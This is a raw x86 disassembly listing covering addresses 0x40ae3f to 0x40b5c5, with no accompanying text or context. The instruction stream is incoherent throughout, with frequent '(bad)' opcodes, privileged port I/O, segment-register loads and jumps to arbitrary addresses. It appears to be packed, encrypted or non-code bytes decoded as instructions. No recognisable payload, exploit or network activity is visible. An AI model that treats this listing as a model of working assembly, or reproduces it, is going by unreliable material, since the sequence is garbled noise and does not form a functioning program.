  40ae3f:	sub    BYTE PTR [edi+0x5907f1b0],ch
  40ae45:	xor    al,BYTE PTR [esi]
  40ae47:	and    eax,0x1a2ffe0b
  40ae4c:	pushf  
  40ae4d:	enter  0x2f78,0xba
  40ae51:	sar    DWORD PTR [ecx+eax*2+0x6fb37773],0x54
  40ae59:	scas   al,BYTE PTR es:[edi]
  40ae5a:	dec    edx
  40ae5b:	or     ebx,DWORD PTR [eax+0x10]
  40ae5e:	retf   0x65cd
  40ae61:	in     eax,dx
  40ae62:	jnp    0x40aeaf
  40ae64:	(bad)  
  40ae65:	cmp    cl,dl
  40ae67:	push   ebp
  40ae68:	cmc    
  40ae69:	and    al,0x4a
  40ae6b:	xor    BYTE PTR [eax+0x0],dl
  40ae6e:	fs inc eax
  40ae70:	mov    edi,0x464b42bb
  40ae75:	inc    edi
  40ae76:	add    bh,BYTE PTR [edx+0x1f]
  40ae79:	jl     0x40ae79
  40ae7b:	push   ebp
  40ae7c:	dec    ebp
  40ae7d:	mov    dh,0x85
  40ae7f:	jle    0x40aea5
  40ae81:	xor    BYTE PTR [ebx+0xf],bh
  40ae84:	dec    ecx
  40ae85:	push   ds
  40ae86:	push   ebp
  40ae87:	jmp    edi
  40ae89:	stc    
  40ae8a:	test   dl,cl
  40ae8c:	popf   
  40ae8d:	adc    BYTE PTR [ecx],bl
  40ae8f:	dec    edx
  40ae90:	xchg   esi,eax
  40ae91:	inc    esi
  40ae92:	dec    ecx
  40ae93:	seto   BYTE PTR [edi]
  40ae96:	push   edi
  40ae97:	fiadd  WORD PTR [ecx+0x6c8ae191]
  40ae9d:	mov    esp,0xdeb28c17
  40aea2:	outs   dx,BYTE PTR ds:[esi]
  40aea3:	xor    BYTE PTR [ecx-0x36],ch
  40aea6:	pop    edi
  40aea7:	mov    ah,0x8
  40aea9:	into   
  40aeaa:	or     ebx,DWORD PTR [ebp-0xd66a357]
  40aeb0:	xchg   ebx,eax
  40aeb1:	test   DWORD PTR [esi],0x8007fb96
  40aeb7:	adc    eax,0x7d8605e6
  40aebc:	cmp    al,0x88
  40aebe:	pop    ds
  40aebf:	push   ecx
  40aec0:	inc    eax
  40aec1:	ins    DWORD PTR es:[edi],dx
  40aec2:	adc    eax,0x5e0579e3
  40aec7:	daa    
  40aec8:	scas   eax,DWORD PTR es:[edi]
  40aec9:	push   0x68
  40aecb:	pop    eax
  40aecc:	or     al,0x3a
  40aece:	mov    esi,0xab4338d1
  40aed3:	fs jmp 0x40aedc
  40aed6:	inc    edx
  40aed7:	pop    esi
  40aed8:	cdq    
  40aed9:	or     DWORD PTR [ecx-0x5aa883db],eax
  40aedf:	adc    al,0xa6
  40aee1:	dec    esi
  40aee2:	inc    ebp
  40aee3:	ja     0x40aebf
  40aee5:	mov    ds:0xebcdb086,al
  40aeea:	xchg   edx,eax
  40aeeb:	xchg   edx,eax
  40aeec:	xor    al,0x1a
  40aeee:	ja     0x40aeac
  40aef0:	xchg   bh,cl
  40aef2:	gs cs adc ecx,ecx
  40aef6:	jne    0x40aeb3
  40aef8:	stos   BYTE PTR es:[edi],al
  40aef9:	push   ds
  40aefa:	jecxz  0x40af03
  40aefc:	dec    edi
  40aefd:	repz sbb bh,ah
  40af00:	inc    ebp
  40af01:	icebp  
  40af02:	jl     0x40aeab
  40af04:	sahf   
  40af05:	jns    0x40af53
  40af07:	addr16 test eax,0xbeee4fc8
  40af0d:	mov    cl,0x2a
  40af0f:	cs pop ebp
  40af11:	aas    
  40af12:	in     al,0x17
  40af14:	xor    DWORD PTR [edx],ebp
  40af16:	out    dx,eax
  40af17:	sub    eax,0x2a5e8870
  40af1c:	or     al,0xf8
  40af1e:	data16 mov dl,0x0
  40af21:	imul   esp,edi,0x4282be0d
  40af27:	or     eax,0x948b1be2
  40af2c:	add    al,BYTE PTR [ebp+0x45f0be81]
  40af32:	inc    esp
  40af33:	loope  0x40af7d
  40af35:	icebp  
  40af36:	rcr    BYTE PTR [ecx+eiz*8],cl
  40af39:	and    ch,BYTE PTR [edx]
  40af3b:	data16 add BYTE PTR [edx-0x13],0xb9
  40af40:	je     0x40af2c
  40af42:	stos   BYTE PTR es:[edi],al
  40af43:	mov    BYTE PTR [edx+0x576c9711],bl
  40af49:	cmp    bh,BYTE PTR [ecx-0x63]
  40af4c:	in     eax,dx
  40af4d:	dec    ebp
  40af4e:	mov    ah,0xcb
  40af50:	and    edx,esp
  40af52:	mov    cs,WORD PTR [eax]
  40af54:	das    
  40af55:	les    ebp,FWORD PTR [ecx+0x5]
  40af58:	mul    BYTE PTR [ecx+esi*4]
  40af5b:	cs mov cl,0xf
  40af5e:	push   ss
  40af5f:	jnp    0x40afdb
  40af61:	mov    bh,0x47
  40af63:	sbb    BYTE PTR [ebp-0x542abbe0],dh
  40af69:	int3   
  40af6a:	dec    ebp
  40af6b:	lds    edx,FWORD PTR [edx]
  40af6d:	mov    ebp,0x154caf67
  40af72:	inc    edx
  40af73:	rcr    DWORD PTR [ebx],cl
  40af75:	jo     0x40af19
  40af77:	rol    DWORD PTR [eax],cl
  40af79:	ret    0x8a7a
  40af7c:	jmp    0x40afdf
  40af7e:	dec    edi
  40af7f:	sbb    eax,DWORD PTR [edi]
  40af81:	adc    eax,ebx
  40af83:	repnz scas al,BYTE PTR es:[edi]
  40af85:	test   eax,0xf13df105
  40af8a:	add    eax,0x1dbda356
  40af8f:	test   al,0x8
  40af91:	mov    cs,WORD PTR [edi]
  40af93:	pop    ebp
  40af94:	bound  edi,QWORD PTR [edi-0x6a]
  40af97:	outs   dx,BYTE PTR ds:[esi]
  40af98:	jne    0x40afe6
  40af9a:	iret   
  40af9b:	and    eax,DWORD PTR [eax-0x3]
  40af9e:	cmp    DWORD PTR [ecx+ebx*1],0x3e
  40afa2:	sbb    al,0xe6
  40afa4:	inc    ecx
  40afa5:	ja     0x40afa9
  40afa7:	sub    ah,BYTE PTR [edx]
  40afa9:	(bad)
  40afac:	or     eax,0x1c18d9db
  40afb1:	xor    eax,0x21ea7e54
  40afb6:	sub    DWORD PTR [ebx-0x5982265c],0x3d
  40afbd:	adc    ebp,edi
  40afbf:	shl    dh,cl
  40afc1:	sbb    BYTE PTR [esi+0x14da279e],bh
  40afc7:	mov    BYTE PTR [edi],cl
  40afc9:	mov    fs,WORD PTR [edi]
  40afcb:	rcr    eax,cl
  40afcd:	lods   eax,DWORD PTR ds:[esi]
  40afce:	mov    eax,ds:0x21a40f9f
  40afd3:	fcmovnb st,st(0)
  40afd5:	arpl   di,dx
  40afd7:	nop
  40afd8:	push   ds
  40afd9:	push   es
  40afda:	mul    DWORD PTR [edi]
  40afdc:	out    dx,al
  40afdd:	cmp    al,BYTE PTR [esi]
  40afdf:	adc    esp,esp
  40afe1:	xchg   ebp,eax
  40afe2:	sub    DWORD PTR [ebp+0x65],eax
  40afe5:	xor    al,0x3d
  40afe7:	mov    dl,BYTE PTR [eax]
  40afe9:	xor    eax,0x57b4f995
  40afee:	fwait
  40afef:	leave  
  40aff0:	shl    DWORD PTR [eax+0x48f8f069],cl
  40aff6:	xchg   DWORD PTR [eax],edx
  40aff8:	nop
  40aff9:	test   edi,esp
  40affb:	pop    eax
  40affc:	lahf   
  40affd:	xor    eax,0x8eb2ec5f
  40b002:	pop    esi
  40b003:	rcr    al,0x9e
  40b006:	data16 int3 
  40b008:	ja     0x40b01f
  40b00a:	dec    esi
  40b00b:	lods   al,BYTE PTR ds:[esi]
  40b00c:	jl     0x40afbd
  40b00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b00f:	push   DWORD PTR [edi+0x30]
  40b012:	gs dec edi
  40b014:	mov    ebp,0xd5a5571e
  40b019:	data16 test BYTE PTR ss:[ebx],al
  40b01d:	fwait
  40b01e:	add    eax,0x12c15bc6
  40b023:	dec    edx
  40b024:	lock stos BYTE PTR es:[edi],al
  40b026:	outs   dx,BYTE PTR ds:[esi]
  40b027:	ret    
  40b028:	inc    eax
  40b029:	push   ss
  40b02a:	fwait
  40b02b:	inc    ebx
  40b02c:	cmp    BYTE PTR cs:[ebx+0x2c],dl
  40b030:	mov    eax,DWORD PTR [edi]
  40b032:	loope  0x40b060
  40b034:	aam    0x9c
  40b036:	xchg   esp,eax
  40b037:	arpl   WORD PTR [eax],bx
  40b039:	add    DWORD PTR [eax+edx*2+0x65f44839],0xc6653e86
  40b044:	adc    eax,0x5f6db91
  40b049:	xor    eax,0xc8b453cb
  40b04e:	jg     0x40b0ac
  40b050:	setne  BYTE PTR [ecx]
  40b053:	pop    esp
  40b054:	popf   
  40b055:	mov    edx,0x1607ffb6
  40b05a:	loope  0x40b005
  40b05c:	cli    
  40b05d:	and    al,0xf0
  40b05f:	jae    0x40b086
  40b061:	add    DWORD PTR [ebp+0x731ec13f],0xffffffea
  40b068:	push   ds
  40b069:	pushf  
  40b06a:	jnp    0x40b051
  40b06c:	jnp    0x40b0bc
  40b06e:	cmc    
  40b06f:	dec    edx
  40b070:	(bad)  
  40b071:	imul   ebp,DWORD PTR [esp+eiz*8-0x68],0x6ba507b1
  40b079:	xchg   DWORD PTR [ebx+0x58ad28ed],ecx
  40b07f:	sahf   
  40b080:	mov    ds,ebp
  40b082:	xor    DWORD PTR [esi+0xa6d29a0],esi
  40b088:	repz mov ds:0x4faa1da3,al
  40b08e:	jl     0x40b0e0
  40b090:	data16 test al,0xa0
  40b093:	adc    al,0xcf
  40b095:	push   es
  40b096:	add    bl,ah
  40b098:	fdiv   st,st(0)
  40b09a:	test   BYTE PTR [edi+0x5ba037a9],0x2f
  40b0a1:	and    DWORD PTR [esi-0x35],esi
  40b0a4:	dec    esp
  40b0a5:	adc    eax,0x5851fb8b
  40b0aa:	fdiv   QWORD PTR [ecx-0x4c41fe32]
  40b0b0:	jnp    0x40b0d3
  40b0b2:	jae    0x40b079
  40b0b4:	in     eax,dx
  40b0b5:	out    0x4a,al
  40b0b7:	push   0x463e3da
  40b0bc:	pop    ds
  40b0bd:	mov    ah,0x93
  40b0bf:	rcr    BYTE PTR [edi-0x33],1
  40b0c2:	fwait
  40b0c3:	bound  esi,QWORD PTR [esi+0x36]
  40b0c6:	and    BYTE PTR [ebp-0x5946b22],ah
  40b0cc:	scas   eax,DWORD PTR es:[edi]
  40b0cd:	or     al,0x26
  40b0cf:	pushf  
  40b0d0:	scas   al,BYTE PTR es:[edi]
  40b0d1:	sub    ebx,DWORD PTR [eax]
  40b0d3:	call   0xa5d7c485
  40b0d8:	mov    dl,0x14
  40b0da:	sub    bl,ah
  40b0dc:	xor    al,0x8d
  40b0de:	and    DWORD PTR [ebx+0x178b6bf6],ecx
  40b0e4:	aad    0xfa
  40b0e6:	pop    DWORD PTR [esi+0x7944016c]
  40b0ec:	iret   
  40b0ed:	push   edx
  40b0ee:	and    eax,0x53d28940
  40b0f3:	adc    DWORD PTR [esi+0x275d93b2],esp
  40b0f9:	fistp  QWORD PTR [edi]
  40b0fb:	and    DWORD PTR [edx],esi
  40b0fd:	sub    eax,0xc998741f
  40b102:	pop    eax
  40b103:	ja     0x40b161
  40b105:	adc    al,0xe7
  40b107:	push   esi
  40b108:	xor    bl,BYTE PTR [ebp+0x68935e15]
  40b10e:	cwde   
  40b10f:	das    
  40b110:	push   ds
  40b111:	fldcw  WORD PTR [esi-0x71d7ab65]
  40b117:	xchg   ebx,eax
  40b118:	sub    esi,DWORD PTR [ebx+0x43571c0]
  40b11e:	pop    ds
  40b11f:	(bad)  
  40b120:	fistp  QWORD PTR [eax+0x35a7adc4]
  40b126:	je     0x40b177
  40b128:	daa    
  40b129:	lds    esi,FWORD PTR [eax]
  40b12b:	xchg   ebp,eax
  40b12c:	je     0x40b0e3
  40b12e:	jbe    0x40b1aa
  40b130:	and    edi,DWORD PTR ds:0xb7b06297
  40b136:	ins    DWORD PTR es:[edi],dx
  40b137:	mov    ebx,0x322225da
  40b13c:	rcr    DWORD PTR [ecx],cl
  40b13e:	pop    ds
  40b13f:	and    DWORD PTR [ecx+esi*8+0xf375528],eax
  40b146:	add    cl,BYTE PTR [ebp-0x2c40ca16]
  40b14c:	dec    ebp
  40b14d:	xchg   esi,eax
  40b14e:	in     al,dx
  40b14f:	lds    esp,FWORD PTR [edx]
  40b151:	push   esp
  40b152:	in     al,0xf6
  40b154:	and    dl,BYTE PTR [edi-0x78]
  40b157:	dec    edx
  40b158:	push   0xd389bc03
  40b15d:	pop    ecx
  40b15e:	fiadd  DWORD PTR [ebp+0x1e2fb982]
  40b164:	inc    ebp
  40b165:	rcr    BYTE PTR [esi],0x69
  40b168:	inc    ecx
  40b169:	and    BYTE PTR [ebp-0x7c1dd76],cl
  40b16f:	mov    esp,0x90e87637
  40b174:	aad    0x18
  40b176:	pop    ss
  40b177:	fisttp WORD PTR [ebx+0x5ad7d0f6]
  40b17d:	cmp    al,BYTE PTR [ecx+0x4eb407e8]
  40b183:	nop
  40b184:	loopne 0x40b17c
  40b186:	into   
  40b187:	fsub   DWORD PTR [ebx]
  40b189:	jnp    0x40b11e
  40b18b:	pop    ds
  40b18c:	test   ebx,eax
  40b18e:	into   
  40b18f:	sbb    BYTE PTR [eax+0x6],bh
  40b192:	cmp    BYTE PTR ds:0x4d89ed9b,bl
  40b198:	sbb    BYTE PTR [esi],al
  40b19a:	faddp  st(5),st
  40b19c:	int    0xef
  40b19e:	cdq    
  40b19f:	ins    DWORD PTR es:[edi],dx
  40b1a0:	aad    0x8f
  40b1a2:	mov    eax,ds:0xd185849d
  40b1a7:	in     al,0x75
  40b1a9:	mov    es,WORD PTR [ecx+0x4b]
  40b1ac:	fmul   st(2),st
  40b1ae:	lods   al,BYTE PTR ds:[esi]
  40b1af:	test   DWORD PTR [ebx],0x7829ea82
  40b1b5:	cmp    edx,esi
  40b1b7:	loopne 0x40b1c2
  40b1b9:	cld    
  40b1ba:	out    dx,eax
  40b1bb:	outs   dx,BYTE PTR ds:[esi]
  40b1bc:	sbb    dh,BYTE PTR [ebx-0x53054d0c]
  40b1c2:	or     BYTE PTR ds:0x47774673,cl
  40b1c8:	xor    DWORD PTR [ebp-0x5c],edx
  40b1cb:	inc    ebx
  40b1cc:	and    eax,0x4ba5f6cf
  40b1d1:	xchg   esi,eax
  40b1d2:	(bad)  
  40b1d3:	mov    bh,0x41
  40b1d5:	bnd je 0x40b235
  40b1d8:	test   eax,0xd00ae429
  40b1dd:	mov    cl,0xa3
  40b1df:	xor    eax,0xb375302c
  40b1e4:	(bad)  
  40b1e6:	ins    BYTE PTR es:[edi],dx
  40b1e7:	(bad)  
  40b1e8:	aaa    
  40b1e9:	out    dx,eax
  40b1ea:	dec    edx
  40b1eb:	and    DWORD PTR [eax+0x32],ebx
  40b1ee:	stc    
  40b1ef:	xor    DWORD PTR [eax-0x5b],esi
  40b1f2:	enter  0xc02a,0xb0
  40b1f6:	cmc    
  40b1f7:	push   edx
  40b1f8:	je     0x40b1fc
  40b1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1fb:	pop    ds
  40b1fc:	dec    ebx
  40b1fd:	dec    eax
  40b1fe:	out    0x24,eax
  40b200:	and    edx,esi
  40b202:	jp     0x40b1b3
  40b204:	(bad)
  40b207:	sbb    BYTE PTR [esi+0x22],0xad
  40b20b:	fs push ebp
  40b20d:	iret   
  40b20e:	pop    ebp
  40b20f:	dec    eax
  40b210:	mov    ecx,0xc4aa88a
  40b215:	inc    ebp
  40b216:	cs mov cl,0x19
  40b219:	in     al,0x45
  40b21b:	in     eax,0x3d
  40b21d:	or     al,0x7f
  40b21f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b220:	test   DWORD PTR [edx],edi
  40b222:	imul   ebx,DWORD PTR [ebp-0x2b4654c8],0x51322c6a
  40b22c:	xchg   edx,eax
  40b22d:	add    ah,BYTE PTR [eax-0x7b99cd66]
  40b233:	xchg   DWORD PTR [ebx*1+0x2f177009],esp
  40b23a:	(bad)  
  40b23b:	pop    edi
  40b23c:	ror    BYTE PTR [eax+0x9],cl
  40b23f:	push   eax
  40b240:	(bad)  
  40b241:	fucomp st(3)
  40b243:	aam    0x86
  40b245:	mov    ss,WORD PTR [esi+edx*1]
  40b248:	popf   
  40b249:	test   ebp,0xcf0aa98d
  40b24f:	xchg   DWORD PTR ds:0xd28f8aa3,esp
  40b255:	xchg   ebx,eax
  40b256:	sbb    ebx,DWORD PTR [esi+0x476b74d4]
  40b25c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b25d:	or     cl,ah
  40b25f:	xor    al,0x78
  40b261:	out    0xea,eax
  40b263:	and    BYTE PTR [ecx],ch
  40b265:	and    bl,al
  40b267:	xchg   esp,eax
  40b269:	bound  ebp,QWORD PTR [ecx-0x4c]
  40b26c:	or     al,0xb6
  40b26e:	addr16 push es
  40b270:	mov    ?,WORD PTR [esi+0x1d]
  40b273:	push   esi
  40b274:	aaa    
  40b275:	(bad)  
  40b276:	push   ebp
  40b277:	pop    esi
  40b278:	pop    ds
  40b279:	sbb    eax,0x39adf84a
  40b27e:	jo     0x40b2eb
  40b280:	cmp    eax,0x2371a124
  40b285:	leave  
  40b286:	fwait
  40b287:	stc    
  40b288:	loope  0x40b2fe
  40b28a:	pop    ss
  40b28b:	mov    esi,0x7c28027e
  40b290:	sahf   
  40b291:	sub    al,cl
  40b293:	pop    ebx
  40b294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b295:	mov    ds:0x614bc1b,al
  40b29a:	xchg   ebx,eax
  40b29b:	out    0xa2,eax
  40b29d:	retf   
  40b29e:	mov    al,ds:0x570a5ae1
  40b2a3:	sti    
  40b2a4:	add    al,BYTE PTR [ecx]
  40b2a6:	rcl    BYTE PTR [edi+ecx*8-0x521bac84],1
  40b2ad:	bound  esi,QWORD PTR [esi-0xa]
  40b2b0:	or     BYTE PTR [esi+0x1fcd1e1c],bh
  40b2b6:	jmp    0x40b2fa
  40b2b8:	stc    
  40b2b9:	mov    ds:0xbfc41341,eax
  40b2be:	sbb    BYTE PTR [edi],ah
  40b2c0:	jp     0x40b322
  40b2c2:	(bad)
  40b2c6:	mov    eax,ds:0x80e1dce5
  40b2cb:	inc    ebx
  40b2cc:	(bad)  
  40b2cd:	jne    0x40b256
  40b2cf:	in     al,0x21
  40b2d1:	inc    ebp
  40b2d2:	repnz xor DWORD PTR [ebp-0x5954041a],0x17359801
  40b2dd:	sub    al,0x6
  40b2df:	push   esi
  40b2e0:	pop    ecx
  40b2e1:	mov    ah,0xf4
  40b2e3:	ins    BYTE PTR es:[edi],dx
  40b2e4:	push   ds
  40b2e5:	inc    eax
  40b2e6:	mov    eax,ds:0x7e210421
  40b2eb:	mov    ecx,eax
  40b2ed:	dec    edi
  40b2ee:	dec    esp
  40b2ef:	std    
  40b2f0:	mov    ?,WORD PTR [edx-0x3d9f09a]
  40b2f6:	std    
  40b2f7:	cmp    BYTE PTR [edi+0xce442da],ah
  40b2fd:	je     0x40b2c5
  40b2ff:	in     eax,dx
  40b300:	cli    
  40b301:	xor    al,0xa0
  40b303:	add    BYTE PTR [ebp-0x2a3eccc3],dl
  40b309:	jmp    0xed42bbdf
  40b30e:	xchg   esi,eax
  40b30f:	pushf  
  40b310:	stos   DWORD PTR es:[edi],eax
  40b311:	xchg   edx,eax
  40b312:	outs   dx,DWORD PTR ds:[esi]
  40b313:	mov    ebx,0x31004ba9
  40b318:	adc    BYTE PTR [esi],0xaa
  40b31b:	rcl    ebx,1
  40b31d:	(bad)  
  40b31e:	xchg   ebp,eax
  40b31f:	fwait
  40b320:	or     eax,0x20aac543
  40b325:	outs   dx,DWORD PTR ds:[esi]
  40b326:	sbb    eax,0x30fa9b54
  40b32b:	test   eax,0xf89b4e56
  40b330:	out    dx,eax
  40b331:	fsub   DWORD PTR [ebx]
  40b333:	mov    ds:0x953c9a1,eax
  40b338:	fmul   QWORD PTR [edi+eiz*4]
  40b33b:	xchg   ecx,eax
  40b33c:	jmp    0xf841:0xa9bee524
  40b343:	sbb    al,0xcb
  40b345:	cwde   
  40b346:	loop   0x40b34e
  40b348:	jb     0x40b2f5
  40b34a:	dec    eax
  40b34b:	in     al,0xaa
  40b34d:	adc    dh,BYTE PTR [edx-0x6fa742c]
  40b353:	inc    ecx
  40b354:	rcr    BYTE PTR [edi+0x16530563],0xa4
  40b35b:	adc    eax,0x9a7abbb8
  40b360:	ins    DWORD PTR es:[edi],dx
  40b361:	cdq    
  40b362:	cwde   
  40b363:	out    dx,eax
  40b364:	adc    eax,0x95205829
  40b369:	jno    0x40b392
  40b36b:	hlt    
  40b36c:	cmp    cl,cl
  40b36e:	cs xor eax,0x616ea9f5
  40b374:	mul    ecx
  40b376:	mov    bl,0xc9
  40b378:	dec    eax
  40b379:	xchg   edx,eax
  40b37a:	fistp  DWORD PTR [ecx+0x16a8909a]
  40b380:	pop    edi
  40b381:	sbb    esp,ecx
  40b383:	jo     0x40b3d5
  40b385:	push   cs
  40b386:	lea    eax,[edi+eiz*4]
  40b389:	add    BYTE PTR [edi-0x28ec5dfd],cl
  40b38f:	mov    dh,0x84
  40b391:	and    DWORD PTR [eax],ebx
  40b393:	sbb    eax,0x20404764
  40b398:	push   ebp
  40b399:	fist   WORD PTR [eax+0x38c3041e]
  40b39f:	in     al,dx
  40b3a0:	or     eax,0xbb7a15fa
  40b3a5:	push   ds
  40b3a6:	sub    dl,dl
  40b3a8:	pushf  
  40b3a9:	dec    edi
  40b3aa:	jmp    0x40b333
  40b3ac:	jbe    0x40b376
  40b3ae:	pop    ds
  40b3af:	or     al,0x6d
  40b3b1:	mov    edi,0x9c7be2eb
  40b3b6:	push   es
  40b3b7:	bound  ebx,QWORD PTR [esi+0x175157bd]
  40b3bd:	dec    esi
  40b3be:	xchg   esp,eax
  40b3bf:	pop    esp
  40b3c0:	cdq    
  40b3c1:	jle    0x40b36e
  40b3c3:	dec    esp
  40b3c4:	rcl    BYTE PTR [eax+ebp*8+0x2539461c],cl
  40b3cb:	mov    dh,0xab
  40b3cd:	xor    eax,0x3182cbc2
  40b3d2:	not    BYTE PTR [ebx+0x80f6de9]
  40b3d8:	sub    ecx,DWORD PTR [esi+0x72]
  40b3db:	arpl   WORD PTR [edx],di
  40b3dd:	je     0x40b3eb
  40b3df:	jnp    0x40b3b7
  40b3e1:	xor    eax,esi
  40b3e3:	and    eax,0xceebe4ec
  40b3e8:	pop    edx
  40b3e9:	and    BYTE PTR [esi],ch
  40b3eb:	or     al,BYTE PTR [edx]
  40b3ed:	push   eax
  40b3ee:	or     BYTE PTR [ebp+0x24],bh
  40b3f1:	xchg   ebp,eax
  40b3f2:	pop    esp
  40b3f3:	ficomp WORD PTR [eax+0x2f0e0191]
  40b3f9:	xchg   DWORD PTR [edi],esi
  40b3fb:	mov    edi,0xa79e4be1
  40b400:	pop    ebx
  40b401:	stos   DWORD PTR es:[edi],eax
  40b402:	and    DWORD PTR [edi-0x508f2231],edi
  40b408:	cmc    
  40b409:	adc    edx,edi
  40b40b:	(bad)  
  40b40c:	mov    bh,0xe8
  40b40e:	mov    ch,BYTE PTR [ecx]
  40b410:	cwde   
  40b411:	sbb    DWORD PTR [edx],0xffffffd6
  40b414:	xchg   esp,eax
  40b415:	rcr    bl,0x82
  40b418:	xchg   BYTE PTR [esi],cl
  40b41a:	js     0x40b3d4
  40b41c:	leave  
  40b41d:	jo     0x40b3be
  40b41f:	cmovs  edi,DWORD PTR [ecx+0x5b]
  40b423:	adc    al,0x3b
  40b425:	aam    0x87
  40b427:	xlat   BYTE PTR ds:[ebx]
  40b428:	(bad)  
  40b429:	scas   eax,DWORD PTR es:[edi]
  40b42a:	sub    ah,BYTE PTR [edx]
  40b42c:	cmp    eax,0xb428f12a
  40b431:	jae    0x40b4ac
  40b433:	int    0x96
  40b435:	xor    esp,0x53
  40b438:	loopne 0x40b485
  40b43a:	fsubr  QWORD PTR [ebx+ebx*4-0x1b]
  40b43e:	ss sti 
  40b440:	std    
  40b441:	icebp  
  40b442:	sar    BYTE PTR [edi-0x382ed86b],cl
  40b448:	pop    ss
  40b449:	push   edx
  40b44a:	pushf  
  40b44b:	mov    ds:0x1f67eff9,al
  40b450:	shld   DWORD PTR [eax-0x1f475549],esp,0xcb
  40b458:	mov    al,ds:0x5c6c0754
  40b45d:	icebp  
  40b45e:	or     eax,0x24ffe01b
  40b463:	jp     0x40b438
  40b465:	cmc    
  40b466:	xchg   esi,eax
  40b467:	add    DWORD PTR [ebp+0x2be8ba4b],ebx
  40b46d:	add    dl,ch
  40b46f:	mov    ebx,0xea9f938b
  40b474:	outs   dx,DWORD PTR ds:[esi]
  40b475:	ja     0x40b4d6
  40b477:	dec    ebx
  40b478:	xchg   edx,eax
  40b479:	addr16 imul eax,ecx,0x8595b088
  40b480:	cmp    esi,DWORD PTR [edx+0x1b]
  40b483:	sar    BYTE PTR [eax-0x572c118a],0xe7
  40b48a:	push   esp
  40b48b:	or     bh,ah
  40b48d:	add    DWORD PTR [ecx+0x754f6fbc],0xfffffffe
  40b494:	test   bh,ch
  40b496:	stos   BYTE PTR es:[edi],al
  40b497:	sbb    BYTE PTR [edi-0x5acfbd42],0x5d
  40b49e:	sbb    ah,cl
  40b4a0:	loopne 0x40b50b
  40b4a2:	ja     0x40b429
  40b4a4:	push   ebp
  40b4a5:	or     eax,DWORD PTR [eax+0x77c3d16c]
  40b4ab:	cmp    DWORD PTR [esi-0x3],esi
  40b4ae:	adc    edi,DWORD PTR [esi]
  40b4b0:	adc    cl,ch
  40b4b2:	jns    0x40b4b4
  40b4b4:	adc    BYTE PTR gs:[eax],dl
  40b4b7:	mov    ecx,0x2cc6b556
  40b4bc:	mov    bh,0x7c
  40b4be:	enter  0x5436,0xaa
  40b4c2:	test   BYTE PTR [ebp+0x18],bl
  40b4c5:	xchg   edi,eax
  40b4c6:	hlt    
  40b4c7:	mov    al,ds:0x786c3163
  40b4cc:	jne    0x40b4c5
  40b4ce:	inc    ebx
  40b4cf:	shld   DWORD PTR [edi+0x740b27ab],edi,0x8f
  40b4d7:	imul   BYTE PTR fs:[ecx+eiz*2-0x6927f847]
  40b4df:	sbb    ebx,DWORD PTR [ecx]
  40b4e1:	jg     0x40b529
  40b4e3:	sbb    bh,BYTE PTR [ebx-0x5c]
  40b4e6:	(bad)  
  40b4e7:	loop   0x40b46a
  40b4e9:	mov    esi,0x635a57d1
  40b4ee:	popf   
  40b4ef:	mov    ebx,0x25ccab31
  40b4f4:	popa   
  40b4f5:	daa    
  40b4f6:	mov    ecx,0xb46ff856
  40b4fb:	mov    ds:0xfc5bf3fa,eax
  40b500:	cmc    
  40b501:	sahf   
  40b502:	popf   
  40b503:	xor    bh,dh
  40b505:	xchg   edx,eax
  40b506:	jb     0x40b54b
  40b508:	les    ebx,FWORD PTR [edx]
  40b50a:	retf   0x601d
  40b50d:	loope  0x40b571
  40b50f:	loope  0x40b54b
  40b511:	mov    al,ds:0x96f24126
  40b516:	and    esp,DWORD PTR [edi]
  40b518:	xlat   BYTE PTR ds:[ebx]
  40b519:	jb     0x40b592
  40b51b:	ins    BYTE PTR es:[edi],dx
  40b51c:	mov    dl,0x3f
  40b51e:	adc    al,0xc9
  40b520:	jl     0x40b57b
  40b522:	add    eax,0xb3091859
  40b527:	outs   dx,DWORD PTR ds:[esi]
  40b528:	mov    ds:0xaa406e,al
  40b52d:	int    0xd2
  40b52f:	jmp    0x69432b83
  40b534:	loopne 0x40b560
  40b536:	sub    eax,0x1c02366a
  40b53b:	mov    ?,WORD PTR [esi]
  40b53d:	pop    esp
  40b53e:	dec    ebx
  40b53f:	(bad)  
  40b540:	mov    ds:0x13aff828,al
  40b545:	ins    BYTE PTR es:[edi],dx
  40b546:	xor    dl,BYTE PTR ds:0xb606b0d
  40b54c:	cmp    BYTE PTR [ebx-0x79dd1b98],bh
  40b552:	pop    es
  40b553:	in     al,0x63
  40b555:	pop    ecx
  40b556:	add    bh,ch
  40b558:	imul   ebp,DWORD PTR [ecx-0x27],0x1b756a52
  40b55f:	mov    ch,0x82
  40b561:	dec    ecx
  40b562:	push   ds
  40b563:	es retf 0xda67
  40b567:	(bad)  
  40b568:	xor    al,0x6c
  40b56a:	retf   
  40b56b:	push   0x43
  40b56d:	sub    al,0x71
  40b56f:	(bad)  
  40b570:	fdiv   QWORD PTR [eax-0x3162a7f5]
  40b576:	mov    edi,DWORD PTR [edi+0x343ca7f8]
  40b57c:	jne    0x40b52d
  40b57e:	push   ebx
  40b57f:	test   BYTE PTR [edi-0x2c7e93f5],bl
  40b585:	test   eax,0x8d094998
  40b58a:	in     al,0x30
  40b58c:	mov    ecx,0x9f16a464
  40b591:	mov    eax,0x5d55daf1
  40b596:	leave  
  40b597:	dec    esp
  40b598:	mov    ch,0xef
  40b59a:	push   0x9e88fa8b
  40b59f:	leave  
  40b5a0:	in     al,dx
  40b5a1:	jge    0x40b57c
  40b5a3:	scas   eax,DWORD PTR es:[edi]
  40b5a4:	mov    ebx,edi
  40b5a6:	sub    bl,BYTE PTR [edi+0x74]
  40b5a9:	into   
  40b5aa:	xchg   edx,eax
  40b5ab:	clc    
  40b5ac:	sbb    BYTE PTR [ebx+0x39],cl
  40b5af:	dec    esi
  40b5b0:	outs   dx,DWORD PTR ds:[esi]
  40b5b1:	xchg   esp,eax
  40b5b2:	not    BYTE PTR [eax]
  40b5b4:	sbb    al,0xf9
  40b5b6:	test   eax,0xde527d29
  40b5bb:	pop    ebx
  40b5bc:	ficom  DWORD PTR [edx+esi*1]
  40b5bf:	stos   BYTE PTR es:[edi],al
  40b5c0:	dec    ebx
  40b5c1:	(bad)  
  40b5c2:	imul   edi,DWORD PTR [eax],0x2d
  40b5c5:	sar    DWORD PTR [edx*4+0x68cc755b],0xa
